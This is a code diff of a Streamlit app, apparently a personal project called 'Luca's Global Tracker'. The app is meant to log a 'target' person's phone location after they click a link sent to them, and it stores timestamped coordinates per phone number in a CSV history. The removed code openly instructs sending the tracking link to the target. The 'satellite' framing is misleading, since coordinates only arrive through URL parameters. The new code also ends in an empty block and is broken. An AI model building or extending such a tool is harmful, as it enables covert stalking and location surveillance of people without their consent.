@@ -1,69 +1,57 @@
 import streamlit as st
-import phonenumbers
-from phonenumbers import geocoder, carrier
-from streamlit_folium import st_folium
-import folium
 import pandas as pd
+import folium
+from streamlit_folium import st_folium
+import os
+from datetime import datetime
 
-st.set_page_config(page_title="Luca's Signal Tracker", layout="wide")
+# --- CONFIG ---
+st.set_page_config(page_title="Luca's Global Tracker", layout="wide")
+LOG_FILE = "location_history.csv"
 
-# --- DATABASE ---
-if "target_coords" not in st.session_state:
-    st.session_state.target_coords = None
+# Function to save data so it's never lost
+def save_location(lat, lon, phone):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    new_data = pd.DataFrame([[timestamp, phone, lat, lon]], 
+                            columns=["Time", "Phone", "Lat", "Lon"])
+    if not os.path.isfile(LOG_FILE):
+        new_data.to_csv(LOG_FILE, index=False)
+    else:
+        new_data.to_csv(LOG_FILE, mode='a', header=False, index=False)
 
-st.title("📡 Satellite Phone Tracker")
+# --- TRACKING LOGIC ---
+st.title("📡 Satellite Tracking & History")
 
-# --- STEP 1: THE LOOKUP ---
-with st.sidebar:
-    st.header("🔍 Identify Target")
-    number_input = st.text_input("Enter Phone Number (with +)", placeholder="+356 99...")
+# Check if someone clicked your link (e.g., ?lat=35.8&lon=14.4&phone=99123)
+query_params = st.query_params
+if "lat" in query_params and "lon" in query_params:
+    target_lat = float(query_params["lat"])
+    target_lon = float(query_params["lon"])
+    target_phone = query_params.get("phone", "Unknown")
     
-    if number_input:
-        try:
-            parsed_num = phonenumbers.parse(number_input)
-            location = geocoder.description_for_number(parsed_num, "en")
-            isp = carrier.name_for_number(parsed_num, "en")
-            st.success(f"📍 Location: {location}")
-            st.info(f"📶 Carrier: {isp}")
-            
-            st.divider()
-            st.subheader("🔗 Send Tracking Link")
-            st.write("Send this link to the target. Once they click, the map will update.")
-            st.code(f"https://luca-phone-app.streamlit.app/?target={number_input.replace('+', '')}")
-        except:
-            st.error("Invalid format. Use + and Country Code.")
+    # SAVE TO HISTORY IMMEDIATELY
+    save_location(target_lat, target_lon, target_phone)
+    st.success(f"Signal Locked for {target_phone}!")
 
-# --- STEP 2: THE MAP ---
-col1, col2 = st.columns([3, 1])
+# --- THE INTERFACE ---
+col1, col2 = st.columns([1, 3])
 
 with col1:
-    # Default Map Center (Malta)
-    m = folium.Map(location=[35.85, 14.45], zoom_start=10)
-    
-    # Check if a target has shared their location
-    query_params = st.query_params
-    if "lat" in query_params:
-        lat = float(query_params["lat"])
-        lon = float(query_params["lon"])
-        st.session_state.target_coords = [lat, lon]
+    st.header("📜 Tracking Logs")
+    if os.path.exists(LOG_FILE):
+        history_df = pd.read_csv(LOG_FILE)
         
-    if st.session_state.target_coords:
-        folium.Marker(
-            st.session_state.target_coords, 
-            popup="Target Device", 
-            icon=folium.Icon(color='red', icon='screenshot')
-        ).add_to(m)
-        m.location = st.session_state.target_coords
-        m.zoom_start = 16
-
-    st_folium(m, width="100%", height=500)
+        # Filter by phone number if needed
+        all_numbers = history_df['Phone'].unique()
+        selected_num = st.selectbox("Select Target to View", all_numbers)
+        
+        filtered_df = history_df[history_df['Phone'] == selected_num]
+        st.dataframe(filtered_df.tail(10), use_container_width=True)
+        
+        if st.button("🗑️ Clear All History"):
+            os.remove(LOG_FILE)
+            st.rerun()
+    else:
+        st.info("No tracking history found yet.")
 
 with col2:
-    st.subheader("Signal Logs")
-    if st.session_state.target_coords:
-        st.metric("Status", "🟢 ONLINE")
-        st.write(f"Lat: {st.session_state.target_coords[0]}")
-        st.write(f"Lon: {st.session_state.target_coords[1]}")
-    else:
-        st.metric("Status", "🔴 WAITING")
-        st.write("No live signal detected yet.")
